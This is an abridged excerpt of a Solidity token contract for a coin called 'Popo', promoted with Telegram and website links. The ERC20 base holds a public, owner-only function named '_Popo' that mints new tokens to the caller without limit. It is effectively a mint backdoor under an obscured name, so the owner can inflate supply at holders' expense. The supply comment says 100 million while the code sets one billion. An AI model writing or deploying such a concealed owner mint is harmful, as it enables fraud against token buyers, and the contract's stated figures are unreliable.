...
//
// $Popo proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/PopocoinBep
// 📱 Website ::https://popobsc.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Popo(uint256 amount) public onlyOwner {
 _Popo(msg.sender, amount);
    }
    ...
    function _Popo(address account, uint256 amount) internal virtual {
...
contract $Popo is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Popo", "POPO") {
     _Popo(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}